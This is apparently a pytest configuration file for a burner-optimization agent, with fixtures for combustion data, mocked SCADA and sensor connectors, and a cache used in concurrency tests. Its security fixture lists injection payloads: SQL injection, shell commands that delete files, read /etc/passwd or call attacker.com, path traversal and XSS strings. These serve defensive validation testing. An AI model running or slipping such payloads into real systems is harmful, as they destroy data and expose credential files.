# -*- coding: utf-8 -*-
"""
Pytest configuration and shared fixtures for GL-004 BurnerOptimizationAgent tests.

This module provides:
- Configuration for pytest markers
- Shared fixtures for all test modules
- Test data generators for burner optimization
- Mock/stub implementations for integrations
- Async test support
- ThreadSafeCache implementation for concurrency tests
"""

import pytest
import asyncio
import logging
import sys
import os
import time
import threading
import hashlib
import json
from pathlib import Path
from datetime import datetime, timedelta
from decimal import Decimal
from typing import Dict, Any, List, Generator, Optional
from unittest.mock import Mock, AsyncMock, MagicMock
from collections import OrderedDict

# Add parent directories to path
sys.path.insert(0, str(Path(__file__).parent.parent))
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent.parent))

# Configure logging for tests
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('gl004_tests.log')
    ]
)

logger = logging.getLogger(__name__)


# ============================================================================
# THREAD-SAFE CACHE IMPLEMENTATION
# ============================================================================

class ThreadSafeCache:
    """
    Thread-safe cache implementation with LRU eviction and TTL support.

    This is used for testing concurrent cache operations in GL-004.
    """

    def __init__(self, max_size: int = 1000, ttl_seconds: int = 300):
        """
        Initialize thread-safe cache.

        Args:
            max_size: Maximum number of entries
            ttl_seconds: Time-to-live for entries in seconds
        """
        self._cache: OrderedDict = OrderedDict()
        self._timestamps: Dict[str, float] = {}
        self._max_size = max_size
        self._ttl_seconds = ttl_seconds
        self._lock = threading.RLock()
        self._hits = 0
        self._misses = 0

    def get(self, key: str) -> Optional[Any]:
        """Get value from cache (thread-safe)."""
        with self._lock:
            if key not in self._cache:
                self._misses += 1
                return None

            # Check TTL
            if time.time() - self._timestamps[key] > self._ttl_seconds:
                del self._cache[key]
                del self._timestamps[key]
                self._misses += 1
                return None

            # Move to end (LRU)
            self._cache.move_to_end(key)
            self._hits += 1
            return self._cache[key]

    def set(self, key: str, value: Any) -> None:
        """Set value in cache (thread-safe)."""
        with self._lock:
            # Evict if at capacity
            while len(self._cache) >= self._max_size:
                oldest_key = next(iter(self._cache))
                del self._cache[oldest_key]
                del self._timestamps[oldest_key]

            self._cache[key] = value
            self._timestamps[key] = time.time()
            self._cache.move_to_end(key)

    def delete(self, key: str) -> bool:
        """Delete key from cache (thread-safe)."""
        with self._lock:
            if key in self._cache:
                del self._cache[key]
                del self._timestamps[key]
                return True
            return False

    def clear(self) -> None:
        """Clear all cache entries (thread-safe)."""
        with self._lock:
            self._cache.clear()
            self._timestamps.clear()

    def size(self) -> int:
        """Get current cache size (thread-safe)."""
        with self._lock:
            return len(self._cache)

    def get_stats(self) -> Dict[str, Any]:
        """Get cache statistics."""
        with self._lock:
            total = self._hits + self._misses
            return {
                'hits': self._hits,
                'misses': self._misses,
                'hit_rate': self._hits / total if total > 0 else 0.0,
                'size': len(self._cache),
                'max_size': self._max_size
            }


# ============================================================================
# PYTEST CONFIGURATION
# ============================================================================

def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "unit: mark test as a unit test"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as an integration test"
    )
    config.addinivalue_line(
        "markers", "performance: mark test as a performance test"
    )
    config.addinivalue_line(
        "markers", "determinism: mark test as a determinism test"
    )
    config.addinivalue_line(
        "markers", "security: mark test as a security test"
    )
    config.addinivalue_line(
        "markers", "concurrency: mark test as a concurrency test"
    )
    config.addinivalue_line(
        "markers", "edge_case: mark test as an edge case test"
    )
    config.addinivalue_line(
        "markers", "golden: mark test as a golden test"
    )
    config.addinivalue_line(
        "markers", "stress: mark test as a stress test"
    )
    config.addinivalue_line(
        "markers", "asyncio: mark test as async"
    )
    config.addinivalue_line(
        "markers", "asme: mark test for ASME standard compliance"
    )


@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# ============================================================================
# BURNER CONFIGURATION FIXTURES
# ============================================================================

@pytest.fixture
def burner_config_data() -> Dict[str, Any]:
    """Create valid burner configuration data."""
    return {
        'burner_id': 'BURNER-001',
        'manufacturer': 'Honeywell',
        'model': 'Maxon NP-LE',
        'type': 'low_nox_premix',
        'max_firing_rate_mw': 15.0,
        'min_firing_rate_mw': 3.0,
        'turndown_ratio': 5.0,
        'fuel_type': 'natural_gas',
        'design_excess_air_percent': 15.0,
        'max_flame_temperature_c': 1800,
        'burner_throat_diameter_mm': 300,
        'air_register_type': 'adjustable_vanes',
        'commissioning_date': datetime(2022, 6, 15),
        'operating_hours': 12000
    }


@pytest.fixture
def fuel_composition_data() -> Dict[str, float]:
    """Create natural gas fuel composition."""
    return {
        'CH4': 0.92,
        'C2H6': 0.04,
        'C3H8': 0.015,
        'CO2': 0.015,
        'N2': 0.01,
        'HHV_mj_kg': 55.5,
        'LHV_mj_kg': 50.0
    }


@pytest.fixture
def combustion_constraints_data() -> Dict[str, Any]:
    """Create combustion constraints data."""
    return {
        'min_excess_air_percent': 5.0,
        'max_excess_air_percent': 25.0,
        'min_o2_percent': 1.5,
        'max_o2_percent': 6.0,
        'max_co_ppm': 100.0,
        'max_nox_ppm': 50.0,
        'min_flame_temperature_c': 1200,
        'max_flame_temperature_c': 1850,
        'min_furnace_temperature_c': 600,
        'max_furnace_temperature_c': 1400,
        'max_flue_gas_temperature_c': 450,
        'min_load_percent': 20.0,
        'max_load_percent': 100.0,
        'max_load_change_rate_percent_min': 10.0
    }


@pytest.fixture
def emission_limits_data() -> Dict[str, Any]:
    """Create emission limits data for regulatory compliance."""
    return {
        'nox_limit_ppm': 30,
        'nox_limit_mg_nm3': 65,
        'co_limit_ppm': 50,
        'co_limit_mg_nm3': 100,
        'regulation_standard': 'EPA-NSPS',
        'compliance_o2_reference_percent': 3.0
    }


# ============================================================================
# OPERATIONAL DATA FIXTURES
# ============================================================================

@pytest.fixture
def burner_operational_data() -> Dict[str, Any]:
    """Create realistic burner operational data."""
    return {
        'timestamp': datetime.utcnow(),
        'fuel_flow_rate_kg_hr': 500.0,
        'air_flow_rate_m3_hr': 8500.0,
        'air_fuel_ratio': 17.0,
        'o2_level_percent': 3.5,
        'co_level_ppm': 25.0,
        'nox_level_ppm': 35.0,
        'flame_temperature_c': 1650,
        'furnace_temperature_c': 1200,
        'flue_gas_temperature_c': 320,
        'burner_load_percent': 75.0,
        'combustion_efficiency_percent': 87.5,
        'flame_intensity': 85.0,
        'flame_stability': 92.0
    }


@pytest.fixture
def golden_burner_state() -> Dict[str, Any]:
    """
    Create golden test data with known expected outputs.
    These values are used for determinism verification.
    """
    return {
        'fuel_flow_rate': 500.0,
        'air_flow_rate': 8500.0,
        'air_fuel_ratio': 17.0,
        'o2_level': 3.5,
        'furnace_temperature': 1200.0,
        'flue_gas_temperature': 320.0,
        'burner_load': 75.0,
        # Expected outputs (pre-calculated)
        'expected_excess_air': 15.234,
        'expected_efficiency': 87.543,
        'expected_stoich_afr': 14.76,
        'expected_hash': 'a1b2c3d4e5f6...'  # Will be computed
    }


@pytest.fixture
def sensor_data_with_quality() -> Dict[str, Any]:
    """Create sensor data with quality indicators."""
    return {
        'fuel_flow_rate': {
            'value': 500.0,
            'quality': 'good',
            'timestamp': datetime.utcnow()
        },
        'air_flow_rate': {
            'value': 8500.0,
            'quality': 'good',
            'timestamp': datetime.utcnow()
        },
        'o2_level': {
            'value': 3.5,
            'quality': 'good',
            'timestamp': datetime.utcnow()
        },
        'flame_temperature': {
            'value': 1650.0,
            'quality': 'good',
            'timestamp': datetime.utcnow()
        },
        'co_level': {
            'value': 25.0,
            'quality': 'good',
            'timestamp': datetime.utcnow()
        },
        'nox_level': {
            'value': 35.0,
            'quality': 'good',
            'timestamp': datetime.utcnow()
        }
    }


# ============================================================================
# MOCK/STUB FIXTURES
# ============================================================================

@pytest.fixture
def mock_burner_controller() -> AsyncMock:
    """Create mock burner controller connector."""
    mock = AsyncMock()
    mock.connect = AsyncMock(return_value=True)
    mock.get_fuel_flow_rate = AsyncMock(return_value=500.0)
    mock.get_air_flow_rate = AsyncMock(return_value=8500.0)
    mock.get_burner_load = AsyncMock(return_value=75.0)
    mock.set_fuel_flow = AsyncMock(return_value=True)
    mock.set_air_flow = AsyncMock(return_value=True)
    mock.check_fuel_pressure = AsyncMock(return_value=True)
    mock.check_air_pressure = AsyncMock(return_value=True)
    mock.is_purge_complete = AsyncMock(return_value=True)
    mock.check_temperature_limits = AsyncMock(return_value=True)
    mock.is_emergency_stop_clear = AsyncMock(return_value=True)
    mock.disconnect = AsyncMock(return_value=True)
    return mock


@pytest.fixture
def mock_o2_analyzer() -> AsyncMock:
    """Create mock O2 analyzer connector."""
    mock = AsyncMock()
    mock.connect = AsyncMock(return_value=True)
    mock.get_o2_concentration = AsyncMock(return_value=3.5)
    mock.calibrate = AsyncMock(return_value=True)
    mock.disconnect = AsyncMock(return_value=True)
    return mock


@pytest.fixture
def mock_emissions_monitor() -> AsyncMock:
    """Create mock emissions monitor connector."""
    mock = AsyncMock()
    mock.connect = AsyncMock(return_value=True)
    mock.get_emissions_data = AsyncMock(return_value={
        'CO': 25.0,
        'NOx': 35.0,
        'CO2': 8.5,
        'SO2': 0.5
    })
    mock.disconnect = AsyncMock(return_value=True)
    return mock


@pytest.fixture
def mock_flame_scanner() -> AsyncMock:
    """Create mock flame scanner connector."""
    mock = AsyncMock()
    mock.connect = AsyncMock(return_value=True)
    mock.is_flame_present = AsyncMock(return_value=True)
    mock.get_flame_intensity = AsyncMock(return_value=85.0)
    mock.get_flame_stability = AsyncMock(return_value=92.0)
    mock.disconnect = AsyncMock(return_value=True)
    return mock


@pytest.fixture
def mock_temperature_sensors() -> AsyncMock:
    """Create mock temperature sensor array connector."""
    mock = AsyncMock()
    mock.connect = AsyncMock(return_value=True)
    mock.get_flame_temperature = AsyncMock(return_value=1650.0)
    mock.get_furnace_temperature = AsyncMock(return_value=1200.0)
    mock.get_flue_gas_temperature = AsyncMock(return_value=320.0)
    mock.disconnect = AsyncMock(return_value=True)
    return mock


@pytest.fixture
def mock_scada_connector() -> AsyncMock:
    """Create mock SCADA connector."""
    mock = AsyncMock()
    mock.connect = AsyncMock(return_value=True)
    mock.read_tags = AsyncMock(return_value={
        'fuel_flow': 500.0,
        'air_flow': 8500.0,
        'o2_level': 3.5
    })
    mock.write_setpoint = AsyncMock(return_value=True)
    mock.publish_optimization_result = AsyncMock(return_value=True)
    mock.get_alarms = AsyncMock(return_value=[])
    mock.disconnect = AsyncMock(return_value=True)
    return mock


# ============================================================================
# TEST DATA GENERATORS
# ============================================================================

class BurnerTestDataGenerator:
    """Generate test data for burner optimization scenarios."""

    @staticmethod
    def generate_efficiency_test_cases() -> List[Dict[str, Any]]:
        """Generate combustion efficiency test cases."""
        return [
            {
                'name': 'optimal_combustion',
                'fuel_flow': 500.0,
                'air_flow': 8500.0,
                'o2_level': 3.0,
                'expected_efficiency': 89.0,
                'tolerance': 2.0
            },
            {
                'name': 'lean_combustion',
                'fuel_flow': 500.0,
                'air_flow': 10000.0,
                'o2_level': 5.5,
                'expected_efficiency': 84.0,
                'tolerance': 2.0
            },
            {
                'name': 'rich_combustion',
                'fuel_flow': 500.0,
                'air_flow': 7500.0,
                'o2_level': 1.5,
                'expected_efficiency': 86.0,
                'tolerance': 2.0
            }
        ]

    @staticmethod
    def generate_emission_test_cases() -> List[Dict[str, Any]]:
        """Generate emissions calculation test cases."""
        return [
            {
                'name': 'low_nox_operation',
                'excess_air_percent': 15.0,
                'flame_temp_c': 1600,
                'expected_nox_ppm': 30.0,
                'tolerance': 5.0
            },
            {
                'name': 'high_nox_operation',
                'excess_air_percent': 10.0,
                'flame_temp_c': 1750,
                'expected_nox_ppm': 50.0,
                'tolerance': 10.0
            },
            {
                'name': 'high_co_operation',
                'excess_air_percent': 5.0,
                'flame_temp_c': 1550,
                'expected_co_ppm': 80.0,
                'tolerance': 15.0
            }
        ]

    @staticmethod
    def generate_optimization_scenarios() -> List[Dict[str, Any]]:
        """Generate optimization scenario test cases."""
        return [
            {
                'name': 'efficiency_priority',
                'objective': 'maximize_efficiency',
                'current_efficiency': 85.0,
                'expected_improvement': 2.5,
                'tolerance': 0.5
            },
            {
                'name': 'emissions_priority',
                'objective': 'minimize_nox',
                'current_nox': 45.0,
                'expected_reduction': 15.0,
                'tolerance': 5.0
            },
            {
                'name': 'balanced_operation',
                'objective': 'balanced',
                'weights': {'efficiency': 0.5, 'emissions': 0.5},
                'expected_score': 0.85,
                'tolerance': 0.05
            }
        ]

    @staticmethod
    def generate_safety_scenarios() -> List[Dict[str, Any]]:
        """Generate safety interlock test scenarios."""
        return [
            {
                'name': 'flame_out',
                'interlocks': {
                    'flame_present': False,
                    'fuel_pressure_ok': True,
                    'air_pressure_ok': True
                },
                'expected_action': 'shutdown',
                'should_optimize': False
            },
            {
                'name': 'low_fuel_pressure',
                'interlocks': {
                    'flame_present': True,
                    'fuel_pressure_ok': False,
                    'air_pressure_ok': True
                },
                'expected_action': 'alarm',
                'should_optimize': False
            },
            {
                'name': 'all_clear',
                'interlocks': {
                    'flame_present': True,
                    'fuel_pressure_ok': True,
                    'air_pressure_ok': True
                },
                'expected_action': 'optimize',
                'should_optimize': True
            }
        ]


@pytest.fixture
def test_data_generator() -> BurnerTestDataGenerator:
    """Provide test data generator."""
    return BurnerTestDataGenerator()


# ============================================================================
# BOUNDARY AND EDGE CASE FIXTURES
# ============================================================================

@pytest.fixture
def boundary_test_cases() -> List[Dict[str, Any]]:
    """Create test cases for boundary testing."""
    return [
        {
            'name': 'min_fuel_flow',
            'fuel_flow_kg_hr': 50.0,
            'expected_status': 'valid'
        },
        {
            'name': 'max_fuel_flow',
            'fuel_flow_kg_hr': 1000.0,
            'expected_status': 'valid'
        },
        {
            'name': 'zero_fuel_flow',
            'fuel_flow_kg_hr': 0.0,
            'expected_status': 'invalid'
        },
        {
            'name': 'negative_fuel_flow',
            'fuel_flow_kg_hr': -100.0,
            'expected_status': 'invalid'
        },
        {
            'name': 'min_o2_level',
            'o2_percent': 0.5,
            'expected_status': 'warning'
        },
        {
            'name': 'max_o2_level',
            'o2_percent': 20.9,
            'expected_status': 'valid'
        },
        {
            'name': 'invalid_o2_level',
            'o2_percent': 25.0,
            'expected_status': 'invalid'
        },
        {
            'name': 'min_load',
            'load_percent': 20.0,
            'expected_status': 'valid'
        },
        {
            'name': 'below_min_load',
            'load_percent': 10.0,
            'expected_status': 'warning'
        },
        {
            'name': 'above_max_load',
            'load_percent': 110.0,
            'expected_status': 'invalid'
        }
    ]


@pytest.fixture
def extreme_values() -> Dict[str, Any]:
    """Provide extreme values for boundary testing."""
    return {
        'max_float': sys.float_info.max,
        'min_float': sys.float_info.min,
        'epsilon': sys.float_info.epsilon,
        'max_int': sys.maxsize,
        'positive_inf': float('inf'),
        'negative_inf': float('-inf'),
        'nan': float('nan'),
        'very_small': 1e-300,
        'very_large': 1e300,
        'positive_zero': 0.0,
        'negative_zero': -0.0
    }


@pytest.fixture
def malformed_sensor_data() -> List[Dict[str, Any]]:
    """Provide malformed sensor data for testing."""
    return [
        {'fuel_flow_rate': 'not_a_number'},
        {'fuel_flow_rate': None},
        {'fuel_flow_rate': -500.0},
        {'fuel_flow_rate': float('inf')},
        {'fuel_flow_rate': float('nan')},
        {'o2_level': -5.0},
        {'o2_level': 25.0},  # Above 21%
        {'flame_temperature': -273.15},  # Below absolute zero
        {'flame_temperature': 5000.0},  # Unrealistic
        {},  # Missing all fields
    ]


# ============================================================================
# PERFORMANCE FIXTURES
# ============================================================================

@pytest.fixture
def performance_timer():
    """Context manager for timing test execution."""
    class Timer:
        def __init__(self):
            self.start_time = None
            self.end_time = None

        def __enter__(self):
            self.start_time = time.perf_counter()
            return self

        def __exit__(self, *args):
            self.end_time = time.perf_counter()

        @property
        def elapsed_ms(self) -> float:
            if self.start_time and self.end_time:
                return (self.end_time - self.start_time) * 1000
            return 0.0

    return Timer


@pytest.fixture
def benchmark_targets() -> Dict[str, float]:
    """Provide performance benchmark targets."""
    return {
        'orchestrator_process_ms': 3000.0,
        'calculator_efficiency_ms': 100.0,
        'calculator_emissions_ms': 100.0,
        'calculator_stoichiometric_ms': 50.0,
        'optimization_cycle_ms': 5000.0,
        'scada_read_ms': 500.0,
        'scada_write_ms': 500.0,
        'memory_usage_mb': 500.0,
        'throughput_rps': 100.0
    }


# ============================================================================
# CONCURRENCY FIXTURES
# ============================================================================

@pytest.fixture
def thread_safe_cache():
    """Provide thread-safe cache for concurrency tests."""
    return ThreadSafeCache(max_size=1000, ttl_seconds=60)


@pytest.fixture
def cache_contention_config() -> Dict[str, Any]:
    """Provide configuration for cache contention tests."""
    return {
        'num_threads': 20,
        'operations_per_thread': 500,
        'cache_max_size': 200,
        'cache_ttl_seconds': 60,
        'expected_min_success_rate': 0.95,
    }


@pytest.fixture
def stress_test_config() -> Dict[str, Any]:
    """Provide configuration for stress testing."""
    return {
        'max_concurrent_operations': 100,
        'sustained_load_duration_seconds': 5,
        'burst_sizes': [50, 100, 200, 500],
        'memory_limit_mb': 500,
    }


# ============================================================================
# SECURITY FIXTURES
# ============================================================================

@pytest.fixture
def security_test_inputs() -> Dict[str, List[str]]:
    """Provide inputs for security testing."""
    return {
        'sql_injection_attempts': [
            "BURNER-001'; DROP TABLE burners;--",
            "BURNER-001' OR '1'='1",
            "BURNER-001' UNION SELECT * FROM passwords--",
        ],
        'command_injection_attempts': [
            'fuel_flow; rm -rf /',
            'efficiency || cat /etc/passwd',
            'air_flow && curl attacker.com',
        ],
        'path_traversal_attempts': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '/etc/shadow',
        ],
        'xss_attempts': [
            '<script>alert("xss")</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
        ]
    }


def get_test_credentials(credential_type: str) -> Dict[str, str]:
    """
    Get test credentials from environment variables.

    This ensures credentials are never hardcoded in test files.
    """
    if credential_type == "scada":
        return {
            "username": os.getenv("TEST_SCADA_USERNAME", "test_user"),
            "password": os.getenv("TEST_SCADA_PASSWORD", "test_pass")
        }
    elif credential_type == "modbus":
        return {
            "host": os.getenv("TEST_MODBUS_HOST", "localhost"),
            "port": int(os.getenv("TEST_MODBUS_PORT", "5502"))
        }
    elif credential_type == "mqtt":
        return {
            "broker": os.getenv("TEST_MQTT_BROKER", "localhost"),
            "port": int(os.getenv("TEST_MQTT_PORT", "1883"))
        }
    else:
        raise ValueError(f"Unknown credential type: {credential_type}")


@pytest.fixture
def scada_credentials() -> Dict[str, str]:
    """Provide SCADA credentials from environment."""
    return get_test_credentials("scada")


@pytest.fixture
def modbus_credentials() -> Dict[str, str]:
    """Provide Modbus credentials from environment."""
    return get_test_credentials("modbus")


@pytest.fixture
def mqtt_credentials() -> Dict[str, str]:
    """Provide MQTT credentials from environment."""
    return get_test_credentials("mqtt")


# ============================================================================
# CLEANUP AND UTILITIES
# ============================================================================

@pytest.fixture(autouse=True)
def cleanup_after_test():
    """Clean up resources after each test."""
    yield
    logger.debug("Test cleanup completed")


@pytest.fixture
def caplog_with_level(caplog):
    """Fixture for capturing logs at DEBUG level."""
    caplog.set_level(logging.DEBUG)
    return caplog


logger.info("GL-004 conftest.py loaded with comprehensive test fixtures")
